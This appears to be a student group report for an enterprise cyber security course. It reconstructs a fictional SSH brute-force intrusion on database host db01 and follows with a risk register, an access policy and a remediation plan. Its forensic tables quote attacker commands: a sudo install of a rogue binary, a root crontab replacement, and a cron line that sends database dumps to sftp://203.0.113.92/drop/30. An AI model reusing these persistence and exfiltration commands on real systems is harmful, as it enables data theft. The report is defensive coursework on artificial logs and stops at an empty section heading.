# Solstice Continental (host db01) — Group 30
## Evidence-Based Security Policy Group Assessment
**Course:** COMPSCI5077 Enterprise Cyber Security | **Submission:** 18 November 2026  
**Document:** Full Core Report (Parts 1 to 4)

---

# Part 1: Incident Analysis & Reconstruction

### 1. Methodology and Event Classification Rules
To investigate the security posture of database host `db01` at Solstice Continental, we programmatically parsed the raw system logs `group30/auth.log` (12,757 lines) and `group30/daemon.log` (7,964 lines), spanning 2 February to 2 May 2026 inclusive (90-day capture). All event counts, network addresses, and temporal sequences in this report originate strictly from programmatic analysis of these two log files.

We operate under the following baseline assumptions and classification criteria:
* **Temporal and Logging Baselines:** Standard syslog timestamps omit the calendar year; we resolve this as 2026 by matching days of the week and date intervals. All recorded timestamps are evaluated in UTC, unaffected by daylight-saving boundaries. System daemon clocks (sshd, pam, sudo, cron) are assumed to be synchronized.
* **Network Boundary Definition:**
  * *Internal Network (`10.50.0.0/16`):* Addresses prefixed with `10.50.` represent corporate workstations and internal infrastructure. These hosts exhibit regular, high-frequency successful authentications (160 to 197 accepted sessions per host over 90 days) with low, sporadic failure counts (5 to 17), consistent with routine typographical mistakes.
  * *Authorized External Range (`198.51.100.0/24`):* Four external addresses (`198.51.100.54`, `198.51.100.125`, `198.51.100.212`, and `198.51.100.68`) belong to pre-authorized third-party business partners and remote employees connecting exclusively during core business hours (09:00 to 15:59 UTC). Consequently, an external IP address is not inherently malicious.
  * *Hostile External Origin:* Source IP `203.0.113.92` represents an unallocated, unauthenticated external entity with no authorized relationship to Solstice Continental.
* **Activity Triage Rules:**
  * **Normal Activity:** SSH authentications originating from `10.50.` or known contractor ranges within business hours; low failure rates ($\le 17$ per 90 days); regular scheduled operational data transfers (e.g. `orders-report` delivering exports to internal host `10.50.1.5:reports`).
  * **Suspicious Activity:** Probing non-existent system usernames (`Invalid user`); multi-account credential spraying ($\ge 3$ distinct accounts probed within an hour); sustained single-account guessing ($\ge 10$ failures/hour); or access attempts occurring during off-hours (00:00–05:00 UTC).
  * **Serious Activity:** Successful authentication directly following anomalous failure bursts; unauthorized privilege elevation (`sudo`) executed by external or service accounts; replacement of root administrative tasks (`crontab`); or database exports egressing to an unauthorized external IP.

---

### Table A: Source Summary Table
*Aggregated authentication attempts across all 17 connecting source IP addresses over the 90-day capture period (sorted by failed authentications descending; presented in a multi-column format to fit the 1.5-page layout).*

| Source Address | Scope | Failed | Accepted | Source Address | Scope | Failed | Accepted | Source Address | Scope | Failed | Accepted |
| :--- | :--- | :---: | :---: | :--- | :--- | :---: | :---: | :--- | :--- | :---: | :---: |
| **203.0.113.92** | External | **225** | **1** | **10.50.1.16** | Internal | 11 | 197 | **10.50.1.10** | Internal | 5 | 168 |
| **10.50.1.20** | Internal | 17 | 180 | **10.50.1.21** | Internal | 11 | 196 | **198.51.100.54** | External | 2 | 33 |
| **10.50.1.12** | Internal | 13 | 174 | **10.50.1.17** | Internal | 10 | 177 | **198.51.100.125** | External | 1 | 28 |
| **10.50.1.14** | Internal | 13 | 196 | **10.50.1.19** | Internal | 10 | 181 | **198.51.100.212** | External | 0 | 18 |
| **10.50.1.15** | Internal | 13 | 163 | **10.50.1.18** | Internal | 9 | 168 | **198.51.100.68** | External | 0 | 26 |
| **10.50.1.11** | Internal | 11 | 187 | **10.50.1.13** | Internal | 8 | 160 | **Total** | — | **359** | **2,253** |

---

### 2. Incident Reconstruction: Chronological Narrative
Across the 90-day logging window, `db01` processed 2,612 total authentication attempts (359 failed, 2,253 accepted). While 16 legitimate sources accounted for modest typing errors, a single hostile external IP, **`203.0.113.92`**, generated **225 of the 359 failed logins (62.7%)** and orchestrated a structured, four-phase intrusion:

1. **Reconnaissance & Account Enumeration (9 March):** At 01:26:22 UTC, `203.0.113.92` initiated an automated probe against `db01` (`auth.log:4657`). Over 5 minutes and 23 seconds, the attacker tested 8 common administrative and service usernames (`webmaster`, `demo`, `testuser`, `deploy`, `test`, `oracle`, `guest`, `administrator`). Each username was tested exactly 3 times before connection termination (`[preauth]`), totaling 24 failed attempts (`auth.log:4657–4726`). All 8 were rejected as non-existent users, confirming active reconnaissance to map active accounts.
2. **Low-and-Slow Credential Spraying (10 March):** Between 21:26:23 and 22:28:00 UTC, the adversary pivoted to password spraying across 7 valid corporate accounts: `iross`, `cwong`, `dsmith`, `gli`, `fjones`, `amurray`, and the remote maintenance account `hvac-remote-30`. The attack executed in 3 discrete rounds spaced exactly 30 minutes (1,800 seconds) apart (`auth.log:5099–5141`), with each account tested once per round (21 attempts total). The deliberate 1,800-second pause reflects an intentional evasion tactic to remain beneath automated threshold alerts. Although all attempts failed, the adversary confirmed the existence of `hvac-remote-30`.
3. **Targeted Brute-Force & Initial Access (12 March):** At 00:26:23 UTC, the attacker launched an intensive brute-force assault focused exclusively on `hvac-remote-30` (`auth.log:5331`). In 21 minutes and 14 seconds, the adversary executed **180 failed password guesses across 60 rapid SSH connections** (averaging 7 seconds per attempt; `auth.log:5331–5690`). Host `db01` had no account lockout or connection-throttling mechanism. At **00:47:37 UTC**, the attacker submitted the correct credential and gained interactive shell access (`auth.log:5691–5692`).  
   *Baseline Anomaly:* Over the entire 90 days, the legitimate HVAC vendor logged in exclusively from static IP `198.51.100.68` during working hours (09:00 to 15:59 UTC, 26 logins) and had never invoked `sudo`. An off-hours login from an untrusted IP was an unprecedented anomaly.
4. **Privilege Escalation & Backdoor Installation (12 March):** Within 5 minutes of entry, the adversary exploited excessive `sudo` privileges configured for `hvac-remote-30`. At 00:52:37 UTC, root permissions were confirmed via `sudo /usr/bin/id` (`auth.log:5693`). At 00:53:52 UTC, the attacker deployed `sudo /usr/bin/install` to promote a hidden payload (`/var/tmp/.maint-30`) to root executable `/usr/local/sbin/orders-sync-30` (`auth.log:5696`). At 00:55:22 UTC, root persistence was finalized via `sudo /usr/bin/crontab -u root /var/tmp/.schedule-30` (`auth.log:5699`), successfully overwriting root's cron schedule (`daemon.log:3198`). The intruder exited at 01:32:37 UTC (`auth.log:5701`), establishing permanent root-level control in just 7.8 minutes.
5. **Automated Exfiltration of Database Assets (13 March – 2 May):** The rogue root cron job activated nightly at 03:39:00 UTC (`daemon.log:3289`). On its first execution on 13 March, `/usr/local/sbin/orders-sync-30` dumped the live PostgreSQL database (`bytes=486,155,249 status=0`; `daemon.log:3292`), harvested that night's genuine daily backup (`bytes=485,598,893 status=0`; `daemon.log:3293`), packaged both files into an uncompressed archive `/var/tmp/.orders-30/orders-20260313.tar` (971,765,760 bytes; `daemon.log:3294`), and exfiltrated the archive via SFTP to `sftp://203.0.113.92/drop/30` (`daemon.log:3295`). This automated cycle ran without failure or detection for **51 consecutive nights**, completing its final captured run on 2 May at 03:48:52 UTC (`daemon.log:7896`), exfiltrating a cumulative **50,136,893,440 bytes (~46.69 GiB)**. Meanwhile, the legitimate contractor continued logging in from `198.51.100.68` 15 times after the breach during daytime hours (last recorded 30 April; `auth.log:20966`), demonstrating that the vendor remained unaware of the compromise.

---

### Table 1: Incident Facts (2026, UTC)
| Incident Fact | Value / Time (UTC) | Verbatim Proving Log Entry | Log Line Reference |
| :--- | :--- | :--- | :--- |
| **Attacker Source IP** | `203.0.113.92` | `Invalid user webmaster from 203.0.113.92 port 47399` | `auth.log:4657` |
| **First Access Attempt** | 2026-03-09 01:26:22 | `Invalid user webmaster from 203.0.113.92 port 47399` | `auth.log:4657` |
| **Compromised Account** | `hvac-remote-30` | `pam_unix(sshd:session): session opened for user hvac-remote-30(uid=1100) by (uid=0)` | `auth.log:5692` |
| **First Successful Login** | 2026-03-12 00:47:37 | `Accepted password for hvac-remote-30 from 203.0.113.92 port 37122 ssh2` | `auth.log:5691` |
| **Privilege Escalation** | 2026-03-12 00:52:37 | `sudo: hvac-remote-30 : TTY=pts/0 ; PWD=/home/hvac-remote-30 ; USER=root ; COMMAND=/usr/bin/id` | `auth.log:5693` |
| **Persistence Established** | 2026-03-12 00:55:23 | `crontab[10145]: (root) REPLACE (root)` | `daemon.log:3198` |
| **Customer Data Compromise** | 2026-03-13 03:48:32 to 2026-05-02 03:48:52 | `orders-sync[10389]: database dump completed job=sync-30-20260313 database=orders ... status=0` (last run at line 7896) | `daemon.log:3292` to `daemon.log:7896` |

---

### Table 2: Chronological Attack Chain Across Logs
| # | Timestamp (UTC) | Log File & Line | Log Line Excerpt | MITRE ATT&CK Technique | Forensic Interpretation |
| :-: | :--- | :--- | :--- | :--- | :--- |
| **1** | Mar 09 01:26:22 | `auth.log:4657` | `Invalid user webmaster from 203.0.113.92 port 47399` | **T1110.004** (Account Exhaustion) | External enumeration of 8 invalid usernames; all rejected by sshd. |
| **2** | Mar 10 21:27:59 | `auth.log:5111` | `Failed password for hvac-remote-30 from 203.0.113.92 port 58585 ssh2` | **T1110.003** (Password Spraying) | Low-and-slow probing of 7 valid accounts in 3 cycles spaced 30 min apart. |
| **3** | Mar 12 00:26:23 | `auth.log:5331` | `Failed password for hvac-remote-30 from 203.0.113.92 port 40379 ssh2` | **T1110.001** (Password Guessing) | High-speed brute-force attack: 180 failures in 21 minutes without throttling. |
| **4** | Mar 12 00:47:37 | `auth.log:5691` | `Accepted password for hvac-remote-30 from 203.0.113.92 port 37122 ssh2` | **T1078.003** (Local Accounts) | Initial foothold: password authentication succeeds from external hostile IP. |
| **5** | Mar 12 00:53:52 | `auth.log:5696` | `sudo: hvac-remote-30 : ... COMMAND=/usr/bin/install -o root -g root -m 0750 /var/tmp/.maint-30 /usr/local/sbin/orders-sync-30` | **T1548.003** (Sudo Elevation) / **T1036** (Masquerading) | Binary dropped to `/var/tmp/.maint-30` is installed into root system path. |
| **6** | Mar 12 00:55:23 | `daemon.log:3198` | `crontab[10145]: (root) REPLACE (root)` | **T1053.003** (Scheduled Task: Cron) | Root persistence achieved via `crontab -u root` (`auth.log:5699`). |
| **7** | Mar 13 03:39:00 | `daemon.log:3289` | `CRON[10388]: (root) CMD (/usr/local/sbin/orders-sync-30 --database orders --include-backups ... sftp://203.0.113.92/drop/30)` | **T1053.003** (Cron Execution) | Scheduled execution: rogue script triggers against database and backups. |
| **8** | Mar 13 03:48:32 | `daemon.log:3292` | `orders-sync[10389]: database dump completed job=sync-30-20260313 database=orders ... bytes=486155249 status=0` | **T1005** (Data from Local System) | Live PostgreSQL database dumped to staging directory. |
| **9** | Mar 13 03:48:37 | `daemon.log:3293` | `orders-sync[10389]: backup read completed job=sync-30-20260313 file=/var/backups/orders/orders-2026-03-13.dump bytes=485598893 status=0` | **T1005** (Data from Local System) | Nightly database backup harvested from local storage. |
| **10** | Mar 13 03:48:42 | `daemon.log:3294` | `orders-sync[10389]: archive completed ... file=/var/tmp/.orders-30/orders-20260313.tar bytes=971765760 status=0` | **T1560.001** (Archive via Utility) | Dump and backup combined into a single 971 MB tarball for staging. |
| **11** | Mar 13 03:51:25 | `daemon.log:3295` | `orders-sync[10389]: transfer completed ... destination=sftp://203.0.113.92/drop/30 bytes=971765760 status=0` | **T1048.002** (Exfiltration Over SFTP) | First successful exfiltration of 971 MB package to external attacker server. |
| **12** | May 02 03:48:52 | `daemon.log:7896` | `orders-sync[21374]: transfer completed job=sync-30-20260502 ... destination=sftp://203.0.113.92/drop/30 bytes=992071680 status=0` | **T1048.002** (Sustained Exfiltration) | Final logged run: 51st continuous extraction; active until logging ended. |

---

### 3. Alternative Explanations and Evidentiary Limitations

#### 3.1 Evaluation and Rejection of Alternative Hypotheses
We evaluated and conclusively rejected the alternative hypothesis that this activity represented legitimate emergency maintenance by an authorized HVAC technician:
1. **Source Subnet Inconsistency:** The genuine supplier connected exclusively from static IP `198.51.100.68` across 26 documented sessions. The 12 March session originated from `203.0.113.92`, an address never previously seen in corporate records.
2. **Preceding Attack Signatures:** Genuine maintenance logins never generated authentication failures (0 failures in 26 visits). Conversely, the 12 March entry occurred only after 180 rapid password failures (spaced 7 seconds apart) following prior username enumeration.
3. **Privilege Abuse Profile:** Over 90 days of normal operations, `hvac-remote-30` never once executed `sudo`. During the intrusion, the session invoked `sudo` within 5 minutes to verify root (`id`), install rogue binaries, and overwrite root's crontab.
4. **Data Exfiltration vs. Operational Reporting:** Genuine business reports (`orders-report`) transfer data strictly to internal server `10.50.1.5:reports` (65 logged transfers). In contrast, `orders-sync-30` sent full database dumps and backups to external IP `203.0.113.92`.
5. **Contractor Obliviousness:** Following the breach, the legitimate contractor continued logging in from `198.51.100.68` 15 times during regular working hours (last seen 30 April). No password change or security report was made, proving the vendor was entirely unaware that their credentials had been compromised.

#### 3.2 Limitations of the Log Evidence
Forensic boundaries must be acknowledged regarding what the evidence cannot prove:
1. **Unlogged Password Content:** Standard Linux PAM and OpenSSH configurations never record password strings. We cannot determine whether the credential was guessed via dictionary, derived from a pattern, or replayed from a third-party leak.
2. **Origin of Harvested Usernames:** The logs do not explain how the adversary acquired the valid usernames targeted on 10 March. Unlogged potential vectors include external phishing, LinkedIn employee harvesting, or a prior breach of the contractor's internal systems.
3. **Local Log Integrity & Root Tamper Risk:** Host `db01` stored logs locally without remote write-once forwarding (SIEM/WORM). Having obtained root at 00:52 UTC, the attacker had the technical capability to truncate, edit, or delete `/var/log/auth.log` and `/var/log/daemon.log`. While intact incriminating lines demonstrate the attacker did not scrub the logs, selective tampering cannot be strictly ruled out.
4. **Perimeter and Endpoint Blind Spots:** The telemetry covers a single server (`db01`). The absence of firewall logs, NetFlow, or contractor endpoint data prevents observation of network-level command-and-control infrastructure or lateral movement to other hosts on `10.50.0.0/16`.

---

# Part 2: Risk Assessment

### Table 3. Core Information Assets at Risk and Consequence of Compromise
| Asset ID | Asset Description | Key CIA | Specific Loss Impact for Solstice Continental |
| :--- | :--- | :---: | :--- |
| **A1** | **Customer Orders Database** (PostgreSQL `orders`) | **C, I, A** | Loss of confidentiality and integrity for active PII and payment records; mandatory ICO notification within 72 hours under UK GDPR Art 33 [4]; potential customer order stoppage. |
| **A2** | **Nightly Database Backups** (`/var/backups/orders/`) | **C, A** | Redundant complete copies of A1; compromise eliminates disaster-recovery isolation and historical confidentiality. |
| **A3** | **Database Server** (`db01`) | **I, A** | Underlying Linux OS infrastructure; root compromise enables arbitrary modification, log tampering, or deletion of A1/A2. |
| **A4** | **Supplier Remote Accounts** (`hvac-remote-30`) | **C, I** | Authorized contractor credentials; compromise provides external foothold into internal host. |
| **A5** | **Root Execution Environment & Scheduler** | **I** | Integrity of privileged paths (`/usr/local/sbin`) and crontab; unauthorized modification enables automated persistence. |

---

### 1. Risk Rating Methodology
Following ISO 27005 principles and adapting NIST SP 800-30 Rev 1 guidelines [6], we assess seven distinct organizational risks exposed by the `db01` incident. Ratings evaluate the system state under existing controls prior to any remediation.

* **Likelihood ($L$, 1–5):** Reflects the probability of successful exploitation within a 12-month window under current safeguards, defined by attack-path accessibility and control effectiveness (Table 4a).
* **Impact ($I$, 1–5):** Evaluates the worst credible harm to Solstice Continental's core assets (Table 3), measured across customer records exposed, operational downtime, and statutory regulatory liabilities under the UK Data Protection Act 2018 / UK GDPR (Table 4b).
* **Risk Score ($S$):** Calculated as $S = L \times I$ (range 1–25). Because risk matrices suffer from rank reversal and range compression [1], quantitative scoring is used solely for relative prioritization. Ratings are justified using both empirical log telemetry and published external empirical research.

#### Table 4a. Likelihood Scale (12-Month Exploitation Probability under Existing Controls)
| Level | Category | Probability | Evidentiary Criteria and Attack-Path Exposure |
| :---: | :--- | :---: | :--- |
| **1** | Rare | 0–4% | Path obstructed by two or more independent, verified controls. |
| **2** | Unlikely | 5–20% | Path obstructed by one active, functioning security control. |
| **3** | Possible | 21–79% | Attack path open, but requires at least two prior foothold/privilege stages. |
| **4** | Likely | 80–95% | Path open and demonstrated active here; requires one prior open stage. |
| **5** | Almost Certain | 96–100% | Path open, externally exposed, and actively targeted; requires no prior foothold. |

#### Table 4b. Impact Scale (Asset-Specific Harm Matrix for Solstice Continental)
| Level | Category | Records Compromised | Operational Disruption | Regulatory & Financial Liability |
| :---: | :--- | :--- | :--- | :--- |
| **1** | Negligible | Zero records exposed | < 1 hour downtime | No regulatory reporting; negligible cost. |
| **2** | Minor | < 1% contact details | 1 hour to 1 day | Internal incident log only; no notice required. |
| **3** | Moderate | 1%–99% partial extract | 1 to 3 days disruption | UK GDPR Art 33 ICO notification likely [4]. |
| **4** | Major | 100% full database | 4 to 7 days outage | Mandatory ICO & customer notice; avg $4.44m cost [7]. |
| **5** | Severe | 100% repeated copies + historical backups | > 7 days critical outage | Max UK GDPR statutory fine (£17.5m / 4% turnover scale; cf. British Airways £20m notice [3]). |

---

### Table 5. Risk Register
*Ranked by Risk Score $S = L \times I$; ties broken by structural kill-chain precedence.*

| Rank | Risk ID & Weakness $\rightarrow$ Consequence | $L$ | $I$ | $S$ | Evidence Basis and Empirical Justification |
| :---: | :--- | :---: | :---: | :---: | :--- |
| **1** | **R1: Exposed Internet SSH without MFA or Lockout**<br>*Weakness:* Single-factor password auth open to Internet; no progressive lockout or rate limits.<br>*Consequence:* External foothold gained on `db01`.<br>*Log evidence:* 180 rapid failures in 21 mins, then accepted login (`auth.log:5331–5691`). | **5** | **4** | **20** | **Both (Logs & External).** Internet-facing SSH ports are probed continuously by automated botnets [5]; lack of lockout allows high-speed guessing [2, 9]. PCI DSS v4.0.1 explicitly mandates MFA for all remote administrative access [10]. Likelihood 5 (no precursor needed); Impact 4 (enables subsequent compromise). |
| **2** | **R2: Standing, Unconstrained Sudo on Contractor Account**<br>*Weakness:* `hvac-remote-30` possessed standing, unrestricted sudo execution rights without limits.<br>*Consequence:* Total root takeover of A1–A5.<br>*Log evidence:* Immediate sudo id, install, and crontab replacement (`auth.log:5693–5699`). | **4** | **5** | **20** | **Both (Logs & External).** Supplier compromises represent the fastest-growing breach vector, doubling to 30% [11]; Target was similarly breached via its HVAC vendor [8]. Once inside, sudo id confirms unconditional root. Likelihood 4 (needs initial access R1); Impact 5 (grants full administrative control over live database and backups). |
| **3** | **R6: Absence of Automated Threat Detection and Response**<br>*Weakness:* No log monitoring or SIEM alerting on anomalous bursts, off-hours access, or egress.<br>*Consequence:* Uncontained exfiltration across 51 days; statutory 72-hour ICO notice missed [4]. | **5** | **4** | **20** | **Both (Logs & External).** Lack of central SIEM or alerts allowed 180 rapid failures, off-hours logins, and 51 nightly transfers to continue unnoticed. Rapid triage and containment (<200 days) reduces average breach cost by over $1.2m [7]. Likelihood 5 (every stage passed silently); Impact 4 (prolongs dwell time and amplifies regulatory fines). |
| **4** | **R7: Unrestricted Access Times and Locations for Third Parties**<br>*Weakness:* Remote login allowed from any IP address at any hour without network origin binding.<br>*Consequence:* Stolen credentials usable off-hours. | 4 | 4 | 16 | **Both (Logs & External).** `hvac-remote-30` logged in 26 times from `198.51.100.68` between 09:00–15:59; the intrusion occurred at 00:47 from `203.0.113.92`. IP whitelisting and schedule controls would have blocked the breach even with a valid password [8]. Likelihood 4; Impact 4. |
| **5** | **R4: Unrestricted Outbound Network Egress on db01**<br>*Weakness:* Egress firewall permits arbitrary outbound SFTP/SSH connections to non-whitelisted IPs.<br>*Consequence:* Database dumps exfiltrated to adversary.<br>*Log evidence:* 51 completed transfers to `sftp://203.0.113.92/drop/30` (`daemon.log:3295–7896`). | 3 | 5 | 15 | **Both (Logs & External).** Host `db01` initiated outbound SFTP connections to untrusted external IPs. Consequence: 50.1 GB database exfiltrated across perimeter [3, 4]. Likelihood 3 (requires prior root); Impact 5 (complete customer database repeated exposure). |
| **6** | **R5: Colocation and Shared Access Path of Live Database and Daily Backups**<br>*Weakness:* Backups readable under same root path.<br>*Consequence:* Live data and recovery backups stolen simultaneously, multiplying breach exposure.<br>*Log evidence:* `orders-sync` read backup file in all 51 runs (`daemon.log:3293`). | 3 | 5 | 15 | **Log Evidence.** Live PostgreSQL data and nightly backup dumps share the same host file system without air-gapping. Consequence: Both live and historical copies stolen in single job. Likelihood 3 (requires root); Impact 5 (redundant loss of confidentiality across primary and backup). |
| **7** | **R3: Unmonitored Local Binary and Cron Tampering**<br>*Weakness:* System binaries in `/usr/local/sbin` and root crontab lack file-integrity monitoring (FIM).<br>*Log evidence:* `auth.log:5696`, `daemon.log:3198`. | 3 | 4 | 12 | **Log Evidence.** Sudo install and crontab replacement executed without integrity checking or secondary approval. Consequence: Rogue `orders-sync-30` scheduled persistently. Likelihood 3 (requires root); Impact 4 (enables R4). |

---

### Table 6. Risk Evaluation Matrix (5x5 Grid; Score $\ge 15$ High, 8–12 Medium, $\le 6$ Low)
| Impact \ Likelihood | 1 (Rare) | 2 (Unlikely) | 3 (Possible) | 4 (Likely) | 5 (Almost Certain) |
| :--- | :---: | :---: | :---: | :---: | :---: |
| **5 (Severe)** | — | — | **R4, R5** | **R2** | — |
| **4 (Major)** | — | — | **R3** | **R7** | **R1, R6** |
| **3 (Moderate)** | — | — | — | — | — |
| **2 (Minor)** | — | — | — | — | — |
| **1 (Negligible)** | — | — | — | — | — |

---

### 2. Risk Selection and Justification for Parts 3 and 4
The three highest-ranked risks are **R1, R2, and R6**, scoring **20 each (High Risk)**. We resolve the three-way tie and select R1, R2, and R6 for policy remediation based on structural dependency across the cyber kill chain:
* **R1 (Initial Foothold via SSH):** Represents the initial ingress vector. Eliminating single-factor, publicly exposed SSH breaks the attack chain at Stage 1, preventing external adversaries from reaching `db01`.
* **R2 (Privilege Escalation via Sudo):** Represents blast-radius containment. Even if credentials are leaked, enforcing least privilege and removing standing sudo prevents unprivileged service accounts from accessing root binaries, system schedulers, and raw database files.
* **R6 (Monitoring and Detection Absence):** Represents organizational oversight. Real-time detection and incident response ensure that even unforeseen anomalies are caught and contained within hours, preventing prolonged exfiltration and satisfying UK GDPR 72-hour reporting requirements.

Risks R4 and R5 also present severe impact ($I=5$, Score 15), but were not selected as primary targets because they sit downstream in the attack progression: an attacker cannot exploit egress or read local backups without first achieving initial access (R1) and root privilege (R2). Remediating R1 and R2 deprives R4 and R5 of their enabling preconditions. Risk R7 (Score 16) is directly subsumed by the remote-access controls of R1. Risk R3 (Score 12) is mitigated as a downstream effect of eliminating standing sudo under R2.

---

# Part 3: Security Policy

===================================================================================================
SOLSTICE CONTINENTAL: Customer-Data Infrastructure Access and Monitoring Policy
Document ID: ISP-07 | Version: 1.0 | Classification: Internal Operational Standard
Policy Owner: Head of Information Security | Executive Sign-off: Chief Information Officer (CIO)
Effective Date: 1 December 2026 | Review Cadence: Annually and immediately following major incidents
===================================================================================================

### 1. Purpose
Customer order records, personal contact data, and associated transaction archives stored on production database servers and backup repositories constitute core informational assets of Solstice Continental. The organization is legally bound under the UK Data Protection Act 2018 and UK GDPR to ensure the confidentiality, integrity, and availability of this data. This policy mandates baseline safeguards for remote connectivity, privilege management, and event auditing across all systems that store, process, or transmit customer assets.

### 2. Scope
This policy applies universally across Solstice Continental to:
* All personnel, including permanent employees, temporary contractors, and third-party maintenance suppliers.
* Every production database server, staging host, and backup repository storing customer information, commencing with host `db01`.
* All network paths, administrative gateways, interactive management protocols (SSH/SFTP), and service accounts providing inbound or outbound connectivity to customer-data systems.

### 3. Policy Directives
* **P1 [R1]. Remote Interactive Access Architecture:** All remote administrative access to customer-data servers from outside the internal network (`10.50.0.0/16`) must terminate at the corporate central access gateway. Direct inbound connections from the public Internet to host-level administrative services (including SSH port 22) are strictly prohibited. All remote sessions must enforce hardware-backed or authenticator-based Multi-Factor Authentication (MFA); authentication relying on single-factor passwords alone is not permitted.
* **P2 [R1]. Credential Protection and Lockout:** Remote-access accounts must belong to individually identifiable persons; shared or group credentials are prohibited. Systems must enforce automated connection throttling and account lockout after no more than five consecutive failed login attempts within a 15-minute window. Passwords must meet minimum complexity standards (minimum 15 characters) and must be revoked and reset immediately upon suspected credential exposure.
* **P3 [R2]. Elimination of Standing Privileges:** Third-party contractors and service accounts must not hold standing administrative or root execution rights (such as unrestricted sudo privileges) on customer-data servers. Administrative elevations will be provisioned on a Just-In-Time (JIT) basis, limited strictly to pre-approved maintenance windows not exceeding eight hours, and revoked automatically.
* **P4 [R2]. Supplier Account Governance:** Every third-party contractor account must have a designated Solstice Continental internal sponsor. Vendor privileges must be restricted strictly to systems and commands explicitly defined in the vendor's service contract. System owners must conduct quarterly entitlement reviews, and supplier accounts must be disabled within one business day of contract termination.
* **P5 [R6]. Centralized Tamper-Resistant Logging:** All authentication events, sudo privilege invocations, file-integrity modifications, and cron job executions on customer-data servers must be forwarded in real-time to a dedicated, off-host central security logging repository (SIEM). Central audit logs must be write-once (WORM-compliant) and immutable to host-level administrators, with retention enforced for a minimum of twelve months to support forensic investigations.
* **P6 [R6]. Real-Time Threat Detection and Incident Escalation:** Security Operations (SecOps) must maintain automated real-time alert rules for: (a) repeated authentication failures; (b) successful logins from previously unseen source IPs or off-hours windows; (c) any sudo elevation by external accounts; and (d) any outbound data transfer exceeding 50 MB or destined for non-whitelisted IP addresses. Alerts must undergo formal triage within one hour and active containment within twenty-four hours. Where customer data breach is confirmed, notification to the Information Commissioner's Office (ICO) must occur within 72 hours of awareness.
* **P7 [R2, R6]. Change Authorization and File Integrity:** The installation of new software binaries into system execution paths (`/usr/local/sbin`, `/usr/local/bin`) and any modification to root-level scheduled tasks (`crontab`) must follow formal change approval. Automated file-integrity monitoring (FIM) must detect and alert on unauthorized binary placement within fifteen minutes.

### 4. Roles and Responsibilities
* **Chief Information Officer (CIO):** Formally approves this policy, ensures budgetary allocation for remediation infrastructure, and holds executive accountability to the Board of Directors.
* **Head of Information Security:** Owns policy governance, reviews effectiveness annually, oversees exception requests, and monitors enterprise-wide compliance reporting.
* **Security Operations (SecOps):** Maintains 24/7 SIEM monitoring, responds to automated security alerts within prescribed triage thresholds, manages the central logging infrastructure, and executes containment workflows.
* **System and Database Owners:** Implement hardening baselines on servers, remove standing vendor sudo privileges, and enforce secure backup segregation.
* **Supplier Sponsors (Contract Managers):** Validate vendor operational necessity, sponsor contractor access requests, and verify prompt account deprovisioning upon task completion.
* **All Authorized Users:** Adhere to acceptable usage standards, protect authentication tokens, and immediately escalate suspicious system anomalies to SecOps.

### 5. Related Documents
* Technical Standard TS-01: Remote Access and Multi-Factor Authentication Architecture
* Technical Standard TS-02: Privileged Access Management and Just-In-Time Elevation
* Technical Standard TS-03: Security Logging, SIEM Ingestion, and Audit Retention Standard
* Operational Procedure OP-04: Infrastructure Change Control and File Integrity Monitoring
* Emergency Procedure EP-01: Cyber Incident Response Plan and ICO Breach Notification Protocol

### 6. Exceptions and Compliance
* **Exception Handling:** Any deviation from this policy requires a formal written Exception Request submitted to the Head of Information Security and the Data Owner. Approval will be granted only where compensating security controls are demonstrated, a named risk owner assumes documented liability, and an explicit expiry date not exceeding 90 days is defined.
* **Compliance and Enforcement:** Compliance is subject to periodic automated audits. Employee violations are subject to formal disciplinary action up to and including termination of employment. Supplier violations constitute a material breach of contract, resulting in immediate account revocation, termination of commercial agreements, and potential civil recovery for damages.

---

# Part 4: Implementation and Evaluation

### 1. Risk Treatment Strategy
Solstice Continental selects **Risk Reduction (Mitigation)** for all three high-ranked risks (**R1, R2, R6; Score 20 each**). 
* **Risk Avoidance**—terminating all third-party remote connectivity—is operationally unviable as the retailer relies on specialized external suppliers for environmental control and critical facilities maintenance.
* **Risk Transfer** via cyber insurance mitigates balance-sheet impact but cannot prevent corporate reputational destruction or discharge statutory notification and compliance obligations under UK GDPR [4].
* **Risk Acceptance** is legally and commercially impermissible for risks of critical severity (Score 20) directly threatening core customer database assets.

---

### 2. Governance, Ownership, and Implementation Phasing
The Head of Information Security maintains executive ownership of the remediation program, reporting fortnightly progress to the CIO.

#### 2.1 Immediate Triage and Containment (Days 0–2)
Because the rogue `orders-sync-30` cron job remained active at the conclusion of the log capture (May 2 03:48:52 UTC), emergency containment must precede architectural deployment:
1. **Active Incident Halt:** Security Operations (SecOps) and the Senior DBA immediately excise the rogue cron line (`daemon.log:3198`) and purge `/usr/local/sbin/orders-sync-30` along with staging files in `/var/tmp/`.
2. **Perimeter Lockdown:** Network firewall rules immediately blacklist external IP `203.0.113.92`, while PAM disables the `hvac-remote-30` account and forces immediate password resets across the seven accounts targeted during the 10 March password spraying campaign.
3. **Forensic Preservation:** A bitstream forensic image of `db01` is acquired for law-enforcement evidentiary chain of custody.
4. **Statutory Notice:** The Data Protection Officer (DPO) initiates formal breach assessment for mandatory disclosure to the Information Commissioner's Office (ICO) within the statutory 72-hour window [4].

#### 2.2 Phased Remediation Plan (Weeks 1–8)
Remediation progresses across Technical, Operational, and Cultural workstreams (Table 7). Crucially, changes to `db01` are piloted in a staging environment to guarantee that legitimate scheduled tasks—including nightly `backup-orders` (90 runs) and internal operational reporting to `10.50.1.5` (65 runs)—remain entirely unimpaired.

#### Table 7. Enterprise Remediation Implementation Roadmap (8-Week Phased Delivery)
| Risk ID & Directives | Weeks 1–2: Stabilization & Containment | Weeks 3–6: Architecture & Controls | Weeks 7–8: Validation & Assurance | Workstream Lead |
| :--- | :--- | :--- | :--- | :--- |
| **R1 (P1, P2)** | Asset discovery; identify all public-facing SSH daemons; enforce 5-failure lockout and alert on 10 failures/hr. | Deploy central MFA access gateway; enrol all employees and third parties in hardware/FIDO2 MFA. | Decommission public SSH port 22 on `db01`; enforce IP whitelisting for contractors. | IT Infrastructure Lead |
| **R2 (P3, P4, P7)** | Strip standing sudo privileges from all contractor accounts on `db01`; audit `/etc/sudoers` across servers. | Deploy Just-In-Time (JIT) elevation portal; enforce ticket-bound 8-hour maximum privilege grants. | Execute quarterly supplier account reviews; revise supplier contractual security annexes. | IAM Lead & Procurement |
| **R6 (P5, P6, P7)** | Deploy central, write-once remote log forwarding (WORM/SIEM); establish 12-month retention repository. | Implement real-time SIEM alert rules for anomalous logins and egress; formalize 24/7 on-call triage rota. | Replay the 90-day attack chain to validate SOC detection; run incident tabletop exercise. | SecOps Manager |

---

### 3. Control Evaluation Metrics Framework
